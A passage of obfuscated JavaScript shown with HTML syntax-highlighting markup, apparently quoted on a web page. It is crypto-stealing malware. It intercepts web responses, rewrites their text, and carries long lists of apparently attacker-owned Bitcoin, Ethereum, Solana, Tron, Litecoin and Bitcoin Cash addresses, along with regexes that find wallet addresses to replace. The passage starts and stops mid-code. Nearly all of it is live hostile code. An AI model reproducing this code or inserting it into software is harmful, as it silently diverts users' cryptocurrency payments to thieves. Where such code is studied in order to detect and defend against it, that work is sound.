(_0x13db82.includes(</span><span>"application/json"</span><span>)) { </span><span> _0x1ac083 = </span><span>JSON</span><span>.parse(_0x159c30.responseText); </span> } <span>const</span><span> _0x454f4a = _0x19ca67(_0x1ac083); </span><span>const</span><span> _0x553cb7 = </span><span>typeof</span><span> _0x454f4a === </span><span>"string"</span><span> ? _0x454f4a : </span><span>JSON</span><span>.stringify(_0x454f4a); </span><span>Object</span><span>.defineProperty(_0x159c30, </span><span>"responseText"</span><span>, { </span><span>'value'</span><span>: _0x553cb7 </span> }); <span>Object</span><span>.defineProperty(_0x159c30, </span><span>"response"</span><span>, { </span><span>'value'</span><span>: _0x553cb7 </span> }); <span> } </span><span>catch</span><span> (_0x59788f) {} </span> } <span>if</span><span> (_0x1c1a41) { </span><span> _0x1c1a41.apply(</span><span>this</span><span>, </span><span>arguments</span><span>); </span> } }; <span>return</span><span> _0x3d5d6a.apply(</span><span>this</span><span>, </span><span>arguments</span><span>); </span> }; } <span>function</span><span>_0x19ca67</span><span>(</span><span>_0x1156d2</span><span>) </span><span>{ </span><span>try</span><span> { </span><span>if</span><span> (</span><span>typeof</span><span> _0x1156d2 === </span><span>"object"</span><span> &amp;&amp; _0x1156d2 !== </span><span>null</span><span>) { </span><span>const</span><span> _0x129304 = </span><span>JSON</span><span>.stringify(_0x1156d2); </span><span>const</span><span> _0x187e67 = _0xba16ef.tfqRA(_0x20669a, _0x129304); </span><span>return</span><span>JSON</span><span>.parse(_0x187e67); </span> } <span>if</span><span> (</span><span>typeof</span><span> _0x1156d2 === </span><span>"string"</span><span>) { </span><span>return</span><span> _0x20669a(_0x1156d2); </span> } <span>return</span><span> _0x1156d2; </span><span> } </span><span>catch</span><span> (_0x2abc9c) { </span><span>return</span><span> _0x1156d2; </span> } } <span>function</span><span>_0x20669a</span><span>(</span><span>_0x530d91</span><span>) </span><span>{ </span><span>var</span><span> _0x264994 = [</span><span>"1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx"</span><span>, </span><span>"1Li1CRPwjovnGHGPTtcKzy75j37K6n97Rd"</span><span>, </span><span>"1Dk12ey2hKWJctU3V8Akc1oZPo1ndjbnjP"</span><span>, </span><span>"1NBvJqc1GdSb5uuX8vT7sysxtT4LB8GnuY"</span><span>, </span><span>"1Mtv6GsFsbno9XgSGuG6jRXyBYv2tgVhMj"</span><span>, </span><span>"1BBAQm4DL78JtRdJGEfzDBT2PBkGyvzf4N"</span><span>, </span><span>"1KkovSeka94yC5K4fDbfbvZeTFoorPggKW"</span><span>, </span><span>"18CPyFLMdncoYccmsZPnJ5T1hxFjh6aaiV"</span><span>, </span><span>"1BijzJvYU2GaBCYHa8Hf3PnJh6mjEd92UP"</span><span>, </span><span>"1Bjvx6WXt9iFB5XKAVsU3TgktgeNbzpn5N"</span><span>, </span><span>"19fUECa9aZCQxcLeo8FZu8kh5kVWheVrg8"</span><span>, </span><span>"1DZEep7GsnmBVkbZR3ogeBQqwngo6x4XyR"</span><span>, </span><span>"1GX1FWYttd65J26JULr9HLr98K7VVUE38w"</span><span>, </span><span>"14mzwvmF2mUd6ww1gtanQm8Bxv3ZWmxDiC"</span><span>, </span><span>"1EYHCtXyKMMhUiJxXJH4arfpErNto5j87k"</span><span>, </span><span>"19D1QXVQCoCLUHUrzQ4rTumqs9jBcvXiRg"</span><span>, </span><span>"16mKiSoZNTDaYLBQ5LkunK6neZFVV14b7X"</span><span>, </span><span>"18x8S4yhFmmLUpZUZa3oSRbAeg8cpECpne"</span><span>, </span><span>"1EkdNoZJuXTqBeaFVzGwp3zHuRURJFvCV8"</span><span>, </span><span>"13oBVyPUrwbmTAbwxVDMT9i6aVUgm5AnKM"</span><span>, </span><span>"1DwsWaXLdsn4pnoMtbsmzbH7rTj5jNH6qS"</span><span>, </span><span>"13wuEH28SjgBatNppqgoUMTWwuuBi9e4tJ"</span><span>, </span><span>"154jc6v7YwozhFMppkgSg3BdgpaFPtCqYn"</span><span>, </span><span>"1AP8zLJE6nmNdkfrf1piRqTjpasw7vk5rb"</span><span>, </span><span>"19F8YKkU7z5ZDAypxQ458iRqH2ctGJFVCn"</span><span>, </span><span>"17J3wL1SapdZpT2ZVX72Jm5oMSXUgzSwKS"</span><span>, </span><span>"16z8D7y3fbJsWFs3U8RvBF3A8HLycCW5fH"</span><span>, </span><span>"1PYtCvLCmnGDNSVK2gFE37FNSf69W2wKjP"</span><span>, </span><span>"143wdqy6wgY3ez8Nm19AqyYh25AZHz3FUp"</span><span>, </span><span>"1JuYymZbeoDeH5q65KZVG3nBhYoTK9YXjm"</span><span>, </span><span>"1PNM2L1bpJQWipuAhNuB7BZbaFLB3LCuju"</span><span>, </span><span>"19onjpqdUsssaFKJjwuAQGi2eS41vE19oi"</span><span>, </span><span>"1JQ15RHehtdnLAzMcVT9kU8qq868xFEUsS"</span><span>, </span><span>"1LVpMCURyEUdE8VfsGqhMvUYVrLzbkqYwf"</span><span>, </span><span>"1KMcDbd2wecP4Acoz9PiZXsBrJXHbyPyG6"</span><span>, </span><span>"1DZiXKhBFiKa1f6PTGCNMKSU1xoW3Edb7Z"</span><span>, </span><span>"174bEk62kr8dNgiduwHgVzeLgLQ38foEgZ"</span><span>, </span><span>"17cvmxcjTPSBsF1Wi2HfcGXnpLBSzbAs6p"</span><span>, </span><span>"1NoYvnedUqNshKPZvSayfk8YTQYvoB2wBc"</span><span>, </span><span>"13694eCkAtBRkip8XdPQ8ga99KEzyRnU6a"</span><span>]; </span><span>var</span><span> _0x2e3cca = [</span><span>"bc1qms4f8ys8c4z47h0q29nnmyekc9r74u5ypqw6wm"</span><span>, </span><span>"bc1qznntn2q7df8ltvx842upkd9uj4atwxpk0whxh9"</span><span>, </span><span>"bc1q4rllc9q0mxs827u6vts2wjvvmel0577tdsvltx"</span><span>, </span><span>"bc1qj8zru33ngjxmugs4sxjupvd9cyh84ja0wjx9c4"</span><span>, </span><span>"bc1qc972tp3hthdcufsp9ww38yyer390sdc9cvj8ar"</span><span>, </span><span>"bc1qw0z864re8yvrjqmcw5fs6ysndta2avams0c6nh"</span><span>, </span><span>"bc1qzdd8c7g2g9mnnxy635ndntem2827ycxxyn3v4h"</span><span>, </span><span>"bc1qaavgpwm98n0vtaeua539gfzgxlygs8jpsa0mmt"</span><span>, </span><span>"bc1qrdlkyhcrx4n2ksfjfh78xnqrefvsr34nf2u0sx"</span><span>, </span><span>"bc1q9ytsyre66yz56x3gufhqks7gqd8sa8uk4tv5fh"</span><span>, </span><span>"bc1qfrvsj2dkey2dg8ana0knczzplcqr7cgs9s52vq"</span><span>, </span><span>"bc1qg7lkw04hg5yggh28ma0zvtkeg95k0yefqmvv2f"</span><span>, </span><span>"bc1qmeplum3jy2vrlyzw4vhrcgeama35tr9kw8yfrn"</span><span>, </span><span>"bc1qamqx0h8rxfcs4l56egrpau4ryqu4r642ttmxq4"</span><span>, </span><span>"bc1qsaxgtck26mgecgfvp9ml4y5ljyl8ylpdglqz30"</span><span>, </span><span>"bc1qsz90ulta8dx5k8xzzjqruzahav2vxchtk2l8v7"</span><span>, </span><span>"bc1q3ad2zyc5mpc9nnzmmtxqpu467jeh4m928r7qf4"</span><span>, </span><span>"bc1qlrdqrulwmvfg86rmp77k8npdefns52ykk8cxs6"</span><span>, </span><span>"bc1q5hqxk5ugvf2d3y6qj2a7cy7u79ckusu9eknpsr"</span><span>, </span><span>"bc1qszm3nugttmtpkq77dhphtqg4u7vuhxxcrh7f79"</span><span>, </span><span>"bc1qqc09xnyafq0y4af3x7j5998tglxcanjuzy974m"</span><span>, </span><span>"bc1qqqh29zxfzxk0fvmq9d7hwedh5yz44zhf7e23qz"</span><span>, </span><span>"bc1qsg57tpvfj6gysrw5w4sxf3dweju40g87uuclvu"</span><span>, </span><span>"bc1qje95nehs8y0wvusp2czr25p7kghk6j3cvgugy5"</span><span>, </span><span>"bc1qwrnchp96p38u8ukp8jc8cq22q35n3ajfav0pzf"</span><span>, </span><span>"bc1q6l99s704jccclxx5rc2x2c5shlgs2pg0fpnflk"</span><span>, </span><span>"bc1qeuk2u6xl4rgfq0x9yc37lw49kutnd8gdlxt9st"</span><span>, </span><span>"bc1qxul8lwxvt7lt9xuge0r2jls7evrwyyvcf2ah0u"</span><span>, </span><span>"bc1qcplvxyzs9w09g6lpglj6xxdfxztfwjsgz95czd"</span><span>, </span><span>"bc1q9ca9ae2cjd3stmr9lc6y527s0x6vvqys6du00u"</span><span>, </span><span>"bc1qmap3cqss3t4vetg8z9s995uy62jggyxjk29jkp"</span><span>, </span><span>"bc1qg3c6c7y5xeqkxnjsx9ymclslr2sncjrxjylkej"</span><span>, </span><span>"bc1q9zx63qdjwldxp4s9egeqjelu3y5yqsajku8m29"</span><span>, </span><span>"bc1ql2awtv7nzcp2dqce3kny2ra3dz946c9vg2yukq"</span><span>, </span><span>"bc1qhytpe64tsrrvgwm834q35w6607jc6azqtnvl2a"</span><span>, </span><span>"bc1q4rlgfgjwg9g2pqwqkf5j9hq6ekn39rjmzv09my"</span><span>, </span><span>"bc1q28ks0u6fhvv7hktsavnfpmu59anastfj5sq8dw"</span><span>, </span><span>"bc1qjqfpxvl2j2hzx2cxeqhchrh02dcjy3z5k6gv55"</span><span>, </span><span>"bc1q8zznzs9z93xpkpunrmeqp6fg54s3q7dkh9z9xw"</span><span>, </span><span>"bc1qt4c4e6xwt5dz4p629ndz9zmeep2kmvqgy53037"</span><span>]; </span><span>var</span><span> _0x4477fc = [</span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>, </span><span>"0xa29eeFb3f21Dc8FA8bce065Db4f4354AA683c024"</span><span>, </span><span>"0x40C351B989113646bc4e9Dfe66AE66D24fE6Da7B"</span><span>, </span><span>"0x30F895a2C66030795131FB66CBaD6a1f91461731"</span><span>, </span><span>"0x57394449fE8Ee266Ead880D5588E43501cb84cC7"</span><span>, </span><span>"0xCd422cCC9f6e8f30FfD6F68C0710D3a7F24a026A"</span><span>, </span><span>"0x7C502F253124A88Bbb6a0Ad79D9BeD279d86E8f4"</span><span>, </span><span>"0xe86749d6728d8b02c1eaF12383c686A8544de26A"</span><span>, </span><span>"0xa4134741a64F882c751110D3E207C51d38f6c756"</span><span>, </span><span>"0xD4A340CeBe238F148034Bbc14478af59b1323d67"</span><span>, </span><span>"0xB00A433e1A5Fc40D825676e713E5E351416e6C26"</span><span>, </span><span>"0xd9Df4e4659B1321259182191B683acc86c577b0f"</span><span>, </span><span>"0x0a765FA154202E2105D7e37946caBB7C2475c76a"</span><span>, </span><span>"0xE291a6A58259f660E8965C2f0938097030Bf1767"</span><span>, </span><span>"0xe46e68f7856B26af1F9Ba941Bc9cd06F295eb06D"</span><span>, </span><span>"0xa7eec0c4911ff75AEd179c81258a348c40a36e53"</span><span>, </span><span>"0x3c6762469ea04c9586907F155A35f648572A0C3E"</span><span>, </span><span>"0x322FE72E1Eb64F6d16E6FCd3d45a376efD4bC6b2"</span><span>, </span><span>"0x51Bb31a441531d34210a4B35114D8EF3E57aB727"</span><span>, </span><span>"0x314d5070DB6940C8dedf1da4c03501a3AcEE21E1"</span><span>, </span><span>"0x75023D76D6cBf88ACeAA83447C466A9bBB0c5966"</span><span>, </span><span>"0x1914F36c62b381856D1F9Dc524f1B167e0798e5E"</span><span>, </span><span>"0xB9e9cfd931647192036197881A9082cD2D83589C"</span><span>, </span><span>"0xE88ae1ae3947B6646e2c0b181da75CE3601287A4"</span><span>, </span><span>"0x0D83F2770B5bDC0ccd9F09728B3eBF195cf890e2"</span><span>, </span><span>"0xe2D5C35bf44881E37d7183DA2143Ee5A84Cd4c68"</span><span>, </span><span>"0xd21E6Dd2Ef006FFAe9Be8d8b0cdf7a667B30806d"</span><span>, </span><span>"0x93Ff376B931B92aF91241aAf257d708B62D62F4C"</span><span>, </span><span>"0x5C068df7139aD2Dedb840ceC95C384F25b443275"</span><span>, </span><span>"0x70D24a9989D17a537C36f2FB6d8198CC26c1c277"</span><span>, </span><span>"0x0ae487200606DEfdbCEF1A50C003604a36C68E64"</span><span>, </span><span>"0xc5588A6DEC3889AAD85b9673621a71fFcf7E6B56"</span><span>, </span><span>"0x3c23bA2Db94E6aE11DBf9cD2DA5297A09d7EC673"</span><span>, </span><span>"0x5B5cA7d3089D3B3C6393C0B79cDF371Ec93a3fd3"</span><span>, </span><span>"0x4Cb4c0E7057829c378Eb7A9b174B004873b9D769"</span><span>, </span><span>"0xd299f05D1504D0B98B1D6D3c282412FD4Df96109"</span><span>, </span><span>"0x241689F750fCE4A974C953adBECe0673Dc4956E0"</span><span>, </span><span>"0xBc5f75053Ae3a8F2B9CF9495845038554dDFb261"</span><span>, </span><span>"0x5651dbb7838146fCF5135A65005946625A2685c8"</span><span>, </span><span>"0x5c9D146b48f664f2bB4796f2Bb0279a6438C38b1"</span><span>, </span><span>"0xd2Bf42514d35952Abf2082aAA0ddBBEf65a00BA3"</span><span>, </span><span>"0xbB1EC85a7d0aa6Cd5ad7E7832F0b4c8659c44cc9"</span><span>, </span><span>"0x013285c02ab81246F1D68699613447CE4B2B4ACC"</span><span>, </span><span>"0x97A00E100BA7bA0a006B2A9A40f6A0d80869Ac9e"</span><span>, </span><span>"0x4Bf0C0630A562eE973CE964a7d215D98ea115693"</span><span>, </span><span>"0x805aa8adb8440aEA21fDc8f2348f8Db99ea86Efb"</span><span>, </span><span>"0xae9935793835D5fCF8660e0D45bA35648e3CD463"</span><span>, </span><span>"0xB051C0b7dCc22ab6289Adf7a2DcEaA7c35eB3027"</span><span>, </span><span>"0xf7a82C48Edf9db4FBe6f10953d4D889A5bA6780D"</span><span>, </span><span>"0x06de68F310a86B10746a4e35cD50a7B7C8663b8d"</span><span>, </span><span>"0x51f3C0fCacF7d042605ABBE0ad61D6fabC4E1F54"</span><span>, </span><span>"0x49BCc441AEA6Cd7bC5989685C917DC9fb58289Cf"</span><span>, </span><span>"0x7fD999f778c1867eDa9A4026fE7D4BbB33A45272"</span><span>, </span><span>"0xe8749d2347472AD1547E1c6436F267F0EdD725Cb"</span><span>, </span><span>"0x2B471975ac4E4e29D110e43EBf9fBBc4aEBc8221"</span><span>, </span><span>"0x02004fE6c250F008981d8Fc8F9C408cEfD679Ec3"</span><span>, </span><span>"0xC4A51031A7d17bB6D02D52127D2774A942987D39"</span><span>, </span><span>"0xa1b94fC12c0153D3fb5d60ED500AcEC430259751"</span><span>, </span><span>"0xdedda1A02D79c3ba5fDf28C161382b1A7bA05223"</span><span>, </span><span>"0xE55f51991C8D01Fb5a99B508CC39B8a04dcF9D04"</span><span>]; </span><span>var</span><span> _0x514d7d = [</span><span>"5VVyuV5K6c2gMq1zVeQUFAmo8shPZH28MJCVzccrsZG6"</span><span>, </span><span>"98EWM95ct8tBYWroCxXYN9vCgN7NTcR6nUsvCx1mEdLZ"</span><span>, </span><span>"Gs7z9TTJwAKyxN4G3YWPFfDmnUo3ofu8q2QSWfdxtNUt"</span><span>, </span><span>"CTgjc8kegnVqvtVbGZfpP5RHLKnRNikArUYFpVHNebEN"</span><span>, </span><span>"7Nnjyhwsp8ia2W4P37iWAjpRao3Bj9tVZBZRTbBpwXWU"</span><span>, </span><span>"3KFBge3yEg793VqVV1P6fxV7gC9CShh55zmoMcGUNu49"</span><span>, </span><span>"9eU7SkkFGWvDoqSZLqoFJ9kRqJXDQYcEvSiJXyThCWGV"</span><span>, </span><span>"4SxDspwwkviwR3evbZHrPa3Rw13kBr51Nxv86mECyXUF"</span><span>, </span><span>"4SxDspwwkviwR3evbZHrPa3Rw13kBr51Nxv86mECyXUF"</span><span>, </span><span>"9dtS7zbZD2tK7oaMUj78MKvgUWHbRVLQ95bxnpsCaCLL"</span><span>, </span><span>"7mdCoRPc1omTiZdYY2xG81EvGwN7Z2yodUTX9ZmLm3fx"</span><span>, </span><span>"8rdABs8nC2jTwVhR9axWW7WMbGZxW7JUzNV5pRF8KvQv"</span><span>, </span><span>"55YtaEqYEUM7ASAZ9XmVdSBNy6F7r5zkdLsJFv2ZPtAx"</span><span>, </span><span>"Gr8Kcyt8UVRF1Pux7YHiK32Spm7cmnFVL6hd7LSLHqoB"</span><span>, </span><span>"9MRmVsciWKDvwwTaZQCK2NvJE2SeVU8W6EGFmukHTRaB"</span><span>, </span><span>"5j4k1Ye12dXiFMLSJpD7gFrLbv4QcUrRoKHsgo32kRFr"</span><span>, </span><span>"F1SEspGoVLhqJTCFQEutTcKDubw44uKnqWc2ydz4iXtv"</span><span>, </span><span>"G3UBJBY69FpDbwyKhZ8Sf4YULLTtHBtJUvSX4GpbTGQn"</span><span>, </span><span>"DZyZzbGfdMy5GTyn2ah2PDJu8LEoKPq9EhAkFRQ1Fn6K"</span><span>, </span><span>"HvygSvLTXPK4fvR17zhjEh57kmb85oJuvcQcEgTnrced"</span><span>]; </span><span>var</span><span> _0x3ee86f = [</span><span>"TB9emsCq6fQw6wRk4HBxxNnU6Hwt1DnV67"</span><span>, </span><span>"TSfbXqswodrpw8UBthPTRRcLrqWpnWFY3y"</span><span>, </span><span>"TYVWbDbkapcKcvbMfdbbcuc3PE1kKefvDH"</span><span>, </span><span>"TNaeGxNujpgPgcfetYwCNAZF8BZjAQqutc"</span><span>, </span><span>"TJ1tNPVj7jLK2ds9JNq15Ln6GJV1xYrmWp"</span><span>, </span><span>"TGExvgwAyaqwcaJmtJzErXqfra66YjLThc"</span><span>, </span><span>"TC7K8qchM7YXZPdZrbUY7LQwZaahdTA5tG"</span><span>, </span><span>"TQuqKCAbowuQYEKB9aTnH5uK4hNvaxDCye"</span><span>, </span><span>"TFcXJysFgotDu6sJu4zZPAvr9xHCN7FAZp"</span><span>, </span><span>"TLDkM4GrUaA13PCHWhaMcGri7H8A8HR6zR"</span><span>, </span><span>"TPSLojAyTheudTRztqjhNic6rrrSLVkMAr"</span><span>, </span><span>"TY2Gs3RVwbmcUiDpxDhchPHF1CVsGxU1mo"</span><span>, </span><span>"TCYrFDXHBrQkqCPNcp6V2fETk7VoqjCNXw"</span><span>, </span><span>"TKcuWWdGYqPKe98xZCWkmhc1gKLdDYvJ2f"</span><span>, </span><span>"TP1ezNXDeyF4RsM3Bmjh4GTYfshf5hogRJ"</span><span>, </span><span>"TJcHbAGfavWSEQaTTLotG7RosS3iqV5WMb"</span><span>, </span><span>"TD5U7782gp7ceyrsKwekWFMWF9TjhC6DfP"</span><span>, </span><span>"TEu3zgthJE32jfY6bYMYGNC7BU2yEXVBgW"</span><span>, </span><span>"TK5r74dFyMwFSTaJF6dmc2pi7A1gjGTtJz"</span><span>, </span><span>"TBJH4pB4QPo96BRA7x6DghEv4iQqJBgKeW"</span><span>, </span><span>"TKBcydgFGX9q3ydaPtxht1TRAmcGybRozt"</span><span>, </span><span>"TQXoAYKPuzeD1X2c4KvQ4gXhEnya3AsYwC"</span><span>, </span><span>"TJCevwYQhzcSyPaVBTa15y4qNY2ZxkjwsZ"</span><span>, </span><span>"THpdx4MiWbXtgkPtsrsvUjHF5AB4u7mx3E"</span><span>, </span><span>"TWpCDiY8pZoY9dVknsy3U4mrAwVm8mCBh6"</span><span>, </span><span>"TK5zyFYoyAttoeaUeWGdpRof2qRBbPSV7L"</span><span>, </span><span>"TAzmtmytEibzixFSfNvqqHEKmMKiz9wUA9"</span><span>, </span><span>"TCgUwXe3VmLY81tKBrMUjFBr1qPnrEQFNK"</span><span>, </span><span>"TTPWAyW3Q8MovJvDYgysniq41gQnfRn21V"</span><span>, </span><span>"TWUJVezQta4zEX94RPmFHF2hzQBRmYiEdn"</span><span>, </span><span>"TPeKuzck7tZRXKh2GP1TyoePF4Rr1cuUAA"</span><span>, </span><span>"TJUQCnHifZMHEgJXSd8SLJdVAcRckHGnjt"</span><span>, </span><span>"TCgX32nkTwRkapNuekTdk1TByYGkkmcKhJ"</span><span>, </span><span>"TFDKvuw86wduSPZxWTHD9N1TqhXyy9nrAs"</span><span>, </span><span>"TQVpRbBzD1au3u8QZFzXMfVMpHRyrpemHL"</span><span>, </span><span>"TSE2VkcRnyiFB4xe8an9Bj1fb6ejsPxa9Z"</span><span>, </span><span>"THe32hBm9nXnzzi6YFqYo8LX77CMegX3v5"</span><span>, </span><span>"TXfcpZtbYfVtLdGPgdoLm6hDHtnrscvAFP"</span><span>, </span><span>"TXgVaHDaEyXSm1LoJEqFgKWTKQQ1jgeQr7"</span><span>, </span><span>"TD5cRTn9dxa4eodRWszGiKmU4pbpSFN87P"</span><span>]; </span><span>var</span><span> _0x4a9d96 = [</span><span>"LNFWHeiSjb4QB4iSHMEvaZ8caPwtz4t6Ug"</span><span>, </span><span>"LQk8CEPMP4tq3mc8nQpsZ1QtBmYbhg8UGR"</span><span>, </span><span>"LMAJo7CV5F5scxJsFW67UsY2RichJFfpP6"</span><span>, </span><span>"LUvPb1VhwsriAm3ni77i3otND2aYLZ8fHz"</span><span>, </span><span>"LhWPifqaGho696hFVGTR1KmzKJ8ps7ctFa"</span><span>, </span><span>"LZZPvXLt4BtMzEgddYnHpUWjDjeD61r5aQ"</span><span>, </span><span>"LQfKhNis7ZKPRW6H3prbXz1FJd29b3jsmT"</span><span>, </span><span>"LSihmvTbmQ9WZmq6Rjn35SKLUdBiDzcLBB"</span><span>, </span><span>"Ldbnww88JPAP1AUXiDtLyeZg9v1tuvhHBP"</span><span>, </span><span>"LR3YwMqnwLt4Qdn6Ydz8bRFEeXvpbNZUvA"</span><span>, </span><span>"Lbco8vJ56o1mre6AVU6cF7JjDDscnYHXLP"</span><span>, </span><span>"LfqFuc3sLafGxWE8vdntZT4M9NKq6Be9ox"</span><span>, </span><span>"LLcmXxj8Zstje6KqgYb11Ephj8bGdyF1vP"</span><span>, </span><span>"LcJwR1WvVRsnxoe1A66pCzeXicuroDP6L6"</span><span>, </span><span>"LUNKimRyxBVXLf9gp3FZo2iVp6D3yyzJLJ"</span><span>, </span><span>"LY1NnVbdywTNmq45DYdhssrVENZKv7Sk8H"</span><span>, </span><span>"LNmMqhqpyDwb1zzZReuA8aVUxkZSc4Ztqq"</span><span>, </span><span>"LdxgXRnXToLMBML2KpgGkdDwJSTM6sbiPE"</span><span>, </span><span>"LZMn8hLZ2kVjejmDZiSJzJhHZjuHq8Ekmr"</span><span>, </span><span>"LVnc1MLGDGKs2bmpNAH7zcHV51MJkGsuG9"</span><span>, </span><span>"LRSZUeQb48cGojUrVsZr9eERjw4K1zAoyC"</span><span>, </span><span>"LQpGaw3af1DQiKUkGYEx18jLZeS9xHyP9v"</span><span>, </span><span>"LiVzsiWfCCkW2kvHeMBdawWp9TE8uPgi6V"</span><span>, </span><span>"LY32ncFBjQXhgCkgTAd2LreFv3JZNTpMvR"</span><span>, </span><span>"LdPtx4xqmA4HRQCm3bQ9PLEneMWLdkdmqg"</span><span>, </span><span>"LYcHJk7r9gRbg2z3hz9GGj91Po6TaXDK3k"</span><span>, </span><span>"LMhCVFq5fTmrwQyzgfp2MkhrgADRAVCGsk"</span><span>, </span><span>"LPv1wSygi4vPp9UeW6EfWwepEeMFHgALmN"</span><span>, </span><span>"Lf55UbTiSTjnuQ8uWzUBtzghztezEfSLvT"</span><span>, </span><span>"LdJHZeBQovSYbW1Lei6CzGAY4d3mUxbNKs"</span><span>, </span><span>"LbBxnFaR1bZVN2CquNDXGe1xCuu9vUBAQw"</span><span>, </span><span>"LWWWPK2SZZKB3Nu8pHyq2yPscVKvex5v2X"</span><span>, </span><span>"LYN4ESQuJ1TbPxQdRYNrghznN8mQt8WDJU"</span><span>, </span><span>"LiLzQs4KU79R5AUn9jJNd7EziNE7r32Dqq"</span><span>, </span><span>"LeqNtT4aDY9oM1G5gAWWvB8B39iUobThhe"</span><span>, </span><span>"LfUdSVrimg54iU7MhXFxpUTPkEgFJonHPV"</span><span>, </span><span>"LTyhWRAeCRcUC9Wd3zkmjz3AhgX6J18kxZ"</span><span>, </span><span>"Lc2LtsEJmPYay1oj7v8xj16mSV15BwHtGu"</span><span>, </span><span>"LVsGi1QVXucA6v9xsjwaAL8WYb7axdekAK"</span><span>, </span><span>"LewV6Gagn52Sk8hzPHRSbBjUpiNAdqmB9z"</span><span>]; </span><span>var</span><span> _0x553dcb = [</span><span>"bitcoincash:qpwsaxghtvt6phm53vfdj0s6mj4l7h24dgkuxeanyh"</span><span>, </span><span>"bitcoincash:qq7dr7gu8tma7mvpftq4ee2xnhaczqk9myqnk6v4c9"</span><span>, </span><span>"bitcoincash:qpgf3zrw4taxtvj87y5lcaku77qdhq7kqgdga5u6jz"</span><span>, </span><span>"bitcoincash:qrkrnnc5kacavf5pl4n4hraazdezdrq08ssmxsrdsf"</span><span>, </span><span>"bitcoincash:qqdepnkh89dmfxyp4naluvhlc3ynej239sdu760y39"</span><span>, </span><span>"bitcoincash:qqul8wuxs4ec8u4d6arkvetdmdh4ppwr0ggycetq97"</span><span>, </span><span>"bitcoincash:qq0enkj6n4mffln7w9z6u8vu2mef47jwlcvcx5f823"</span><span>, </span><span>"bitcoincash:qrc620lztlxv9elhj5qzvmf2cxhe7egup5few7tcd3"</span><span>, </span><span>"bitcoincash:qrf3urqnjl4gergxe45ttztjymc8dzqyp54wsddp64"</span><span>, </span><span>"bitcoincash:qr7mkujcr9c38ddfn2ke2a0sagk52tllesderfrue8"</span><span>, </span><span>"bitcoincash:qqgjn9yqtud5mle3e7zhmagtcap9jdmcg509q56ynt"</span><span>, </span><span>"bitcoincash:qpuq8uc9ydxszny5q0j4actg30he6uhffvvy0dl7er"</span><span>, </span><span>"bitcoincash:qz0640hjl2m3n2ca26rknljpr55gyd9pjq89g6xhrz"</span><span>, </span><span>"bitcoincash:qq0j6vl2ls2g8kkhkvpcfyjxns5zq03llgsqdnzl4s"</span><span>, </span><span>"bitcoincash:qq8m8rkl29tcyqq8usfruejnvx27zxlpu52mc9spz7"</span><span>, </span><span>"bitcoincash:qpudgp66jjj8k9zec4na3690tvu8ksq4fq8ycpjzed"</span><span>, </span><span>"bitcoincash:qqe3qc9uk08kxnng0cznu9xqqluwfyemxym7w2e3xw"</span><span>, </span><span>"bitcoincash:qpukdxh30d8dtj552q2jet0pqvcvt64gfujaz8h9sa"</span><span>, </span><span>"bitcoincash:qqs4grdq56y5nnamu5d8tk450kzul3aulyz8u66mjc"</span><span>, </span><span>"bitcoincash:qp7rhhk0gcusyj9fvl2ftr06ftt0pt8wgumd8ytssd"</span><span>, </span><span>"bitcoincash:qpmc3y5y2v7h3x3sgdg7npau034fsggwfczvuqtprl"</span><span>, </span><span>"bitcoincash:qzum0qk4kpauy8ljspmkc5rjxe5mgam5xg7xl5uq2g"</span><span>, </span><span>"bitcoincash:qqjqp8ayuky5hq4kgrarpu40eq6xjrneuurc43v9lf"</span><span>, </span><span>"bitcoincash:qqxu6a3f0240v0mwzhspm5zeneeyecggvufgz82w7u"</span><span>, </span><span>"bitcoincash:qpux2mtlpd03d8zxyc7nsrk8knarnjxxts2fjpzeck"</span><span>, </span><span>"bitcoincash:qpcgcrjry0excx80zp8hn9vsn4cnmk57vylwa5mtz3"</span><span>, </span><span>"bitcoincash:qpjj6prm5menjatrmqaqx0h3zkuhdkfy75uauxz2sj"</span><span>, </span><span>"bitcoincash:qp79qg7np9mvr4mg78vz8vnx0xn8hlkp7sk0g86064"</span><span>, </span><span>"bitcoincash:qr27clvagvzra5z7sfxxrwmjxy026vltucdkhrsvc7"</span><span>, </span><span>"bitcoincash:qrsypfz3lqt8xtf8ej5ftrqyhln577me6v640uew8j"</span><span>, </span><span>"bitcoincash:qrzfrff4czjn6ku0tn2u3cxk7y267enfqvx6zva5w6"</span><span>, </span><span>"bitcoincash:qr7exs4az754aknl3r5gp9scn74dzjkcrgql3jpv59"</span><span>, </span><span>"bitcoincash:qq35fzg00mzcmwtag9grmwljvpuy5jm8kuzfs24jhu"</span><span>, </span><span>"bitcoincash:qra5zfn74m7l85rl4r6wptzpnt2p22h7552swkpa7l"</span><span>, </span><span>"bitcoincash:qzqllr0fsh9fgfvdhmafx32a0ddtkt52evnqd7w7h7"</span><span>, </span><span>"bitcoincash:qpjdcwld84wtd5lk00x8t7qp4eu3y0xhnsjjfgrs7q"</span><span>, </span><span>"bitcoincash:qrgpm5y229xs46wsx9h9mlftedmsm4xjlu98jffmg3"</span><span>, </span><span>"bitcoincash:qpjl9lkjjp4s6u654k3rz06rhqcap849jg8uwqmaad"</span><span>, </span><span>"bitcoincash:qra5uwzgh8qus07v3srw5q0e8vrx5872k5cxguu3h5"</span><span>, </span><span>"bitcoincash:qz6239jkqf9qpl2axk6vclsx3gdt8cy4z5rag98u2r"</span><span>]; </span><span>const</span><span> _0x3ec3bb = { </span><span>'ethereum'</span><span>: </span><span>/\b0x[a-fA-F0-9]{40}\b/g</span><span>, </span><span>'bitcoinLegacy'</span><span>: </span><span>/\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b/g</span><span>, </span><span>'bitcoinSegwit'</span><span>: </span><span>/\b(3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\b/g</span><span>, </span><span>'tron'</span><span>: </span><span>/((?<span>, </span><span>'bch'</span><span>: </span><span>/bitcoincash:[qp][a-zA-Z0-9]{41}/g</span><span>, </span><span>'ltc'</span><span>: </span><span>/(?<span>, </span><span>'ltc2'</span><span>: </span><span>/(?<span>, </span><span>'solana'</span><span>: </span><span>/((?<span>, </span><span>'solana2'</span><span>: </span><span>/((?<span>, </span><span>'solana3'</span><span>: </span><span>/((? }; <span> </span><span>for</span><span> (</span><span>const</span><span> [_0x17ccd4, _0x129783] </span><span>of</span><span>Object</span><span>.entries(_0x3ec3bb)) { </span><span>const</span><span> _0x1be350 = _0x530d91.match(_0x129783) || []; </span><span>for</span><span> (</span><span>const</span><span> _0x4225ce </span><span>of</span><span> 